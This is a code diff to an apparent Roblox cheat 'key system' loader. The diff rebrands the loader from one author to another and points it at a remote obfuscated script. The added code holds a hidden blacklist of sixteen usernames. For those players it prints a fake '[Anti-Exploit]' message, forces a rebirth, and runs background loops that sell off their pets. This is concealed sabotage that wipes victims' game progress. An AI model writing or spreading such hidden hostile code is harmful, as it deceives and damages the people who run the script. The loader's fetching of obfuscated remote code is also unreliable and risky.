@@ -1,7 +1,103 @@
+-- ==========================================
+-- BLACKLIST & CONFIGURATION SYSTEM
+-- ==========================================
+local BLACKLISTED_USERS = {
+    "eyuns09",
+    "mikko234514",
+    "Jqmezgaming123",
+    "Argusgodss",
+    "mhar_rivals",
+    "sahsa12345l",
+    "Xx76_vibezz",
+    "TAKEME356",
+    "Yuki_16747",
+    "georgeportabes",
+    "Code5yndicateXMain",
+    "XDCraftersgame",
+    "sadtryfornothing",
+    "rbhinghuf",
+    "18734D8",
+    "baby_girl1n4"
+}
+
+local function isBlacklisted(player)
+    for _, idOrName in ipairs(BLACKLISTED_USERS) do
+        if type(idOrName) == "number" and player.UserId == idOrName then
+            return true
+        elseif type(idOrName) == "string" and player.Name:lower() == idOrName:lower() then
+            return true
+        end
+    end
+    return false
+end
+
+local Players = game:GetService("Players")
+local localPlayer = Players.LocalPlayer or Players:GetPropertyChangedSignal("LocalPlayer"):Wait()
+
+-- ==========================================
+-- KUNG BLACKLISTED: Auto-Rebirth & Auto-Sell AGAD (Walang Key System na lalabas)
+-- ==========================================
+if isBlacklisted(localPlayer) then
+    print("[Anti-Exploit] Blacklisted player detected. Executing auto-rebirth and auto-sell...")
+    
+    -- 1. Auto-Rebirth
+    pcall(function()
+        game:GetService("ReplicatedStorage").remotes.rebirthRequest:FireServer()
+    end)
+    
+    -- 2. Background Auto-Sell System
+    local ReplicatedStorage = game:GetService("ReplicatedStorage")
+    local remotesFolder = ReplicatedStorage:FindFirstChild("remotes") or ReplicatedStorage:FindFirstChild("Remotes")
+    local sellRemote = nil
+    
+    if remotesFolder then
+        sellRemote = remotesFolder:FindFirstChild("sellPet") 
+            or remotesFolder:FindFirstChild("SellPet") 
+            or remotesFolder:FindFirstChild("sellRequest")
+            or remotesFolder:FindFirstChild("SellRequest")
+    end
+    
+    if sellRemote then
+        local function startBackgroundAutoSell(petName)
+            task.spawn(function()
+                while true do
+                    local p = Players.LocalPlayer
+                    local petsFolder = p:FindFirstChild("PetsFolder") or p:FindFirstChild("Pets")
+                    
+                    if petsFolder and petsFolder:FindFirstChild(petName) then
+                        pcall(function()
+                            sellRemote:FireServer(petsFolder[petName])
+                        end)
+                    end
+                    
+                    task.wait(1)
+                end
+            end)
+        end
+        
+        local petsToAutoSell = {
+            "Cat", "Dog", "Rabbit", "Hamster", "Shark",
+            "Wolf", "Fox", "MuscleMan", "Spike", "Bear",
+            "Snow Wolf", "Forest Deer", "Fire Pup", "Shadow Wolf", "Thunder Bear",
+            "Spirit Wolf", "Storm Tiger", "Lunar Dragon", "Crystal Dragon",
+            "Pelican", "Divine Dragon", "Neon Divine Dragon", "Space Dragon",
+            "Red Alien", "Fire Alien", "Vortex", "Astrax",
+            "Rage Shark", "Titan Crocodile", "Battle Gorilla", "Champion Dragon"
+        }
+        
+        for _, pet in ipairs(petsToAutoSell) do
+            startBackgroundAutoSell(pet)
+        end
+    end
+    
+    -- I-terminate na ang script para hindi na lumabas ang UI sa mga blacklisted
+    return
+end
+
 -- // Configuration
-local Key = "KyleXAkimbo"
-local ScriptUrl = "https://raw.githubusercontent.com/Script-Kyle/Second/refs/heads/main/obfuscated.lua%20(8).txt"
-local DiscordLink = "https://discord.com/channels/1423898082331988050/1441271557321261057"
+local Key = "PrimeKenzouu"
+local ScriptUrl = "https://slh-hub.lovable.app/raw/kyomba2-obfuscated"
+local TiktokLink = "https://tiktok.com/kenzxouu.official"
 
 -- // Services
 local TweenService = game:GetService("TweenService")
@@ -78,7 +174,7 @@ introTween:Play()
 -- Title & Subtitle
 local TitleLabel = Instance.new("TextLabel")
 TitleLabel.Parent = MainFrame
-TitleLabel.Text = "Akimbo Key System"
+TitleLabel.Text = "Kenzou Key System"
 TitleLabel.Size = UDim2.new(1, 0, 0, 50)
 TitleLabel.BackgroundTransparency = 1
 TitleLabel.TextColor3 = Color3.fromRGB(0, 255, 200)
@@ -87,7 +183,7 @@ TitleLabel.TextSize = 22
 
 local SubTitleLabel = Instance.new("TextLabel")
 SubTitleLabel.Parent = MainFrame
-SubTitleLabel.Text = "Made by: Kyle X Akimbo"
+SubTitleLabel.Text = "Made by: PrimeKenzou"
 SubTitleLabel.Size = UDim2.new(1, 0, 0, 20)
 SubTitleLabel.Position = UDim2.new(0, 0, 0.18, 0)
 SubTitleLabel.BackgroundTransparency = 1
